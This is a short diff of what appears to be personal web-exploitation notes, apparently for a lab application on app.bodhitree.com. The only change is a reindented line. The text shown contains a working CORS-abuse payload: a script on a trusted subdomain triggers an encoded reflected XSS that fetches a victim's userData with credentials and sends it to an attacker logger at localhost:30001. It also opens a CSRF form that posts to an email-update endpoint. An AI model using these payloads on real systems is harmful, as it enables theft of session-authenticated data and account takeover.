@@ -111,7 +111,7 @@ cors -
 	trusted subdomain
 	<script>document.location="http://app.bodhitree.com:30000/participants/?
 	courseid=2&search=%3Cscript%3Efetch%28%27http%3A%2F%2Fapp.bodhitree.com%3A30000%2FuserData%27%2C%20%7Bcredentials%3A%27include%27%7D%29.then%28r%3D%3Er.text%28%29%29.
-	then%28j%3D%3Elocation%3D%27http%3A%2F%2Flocalhost%3A30001%2Flog%3Fkey%3D%27%2BencodeURIComponent%28j%29%29%3B%3C%2Fscript%3E"</script>
+then%28j%3D%3Elocation%3D%27http%3A%2F%2Flocalhost%3A30001%2Flog%3Fkey%3D%27%2BencodeURIComponent%28j%29%29%3B%3C%2Fscript%3E"</script>
 	
 csrf - JS form
 	<form action="http://localhost:30000/updateEmail/" method="POST">
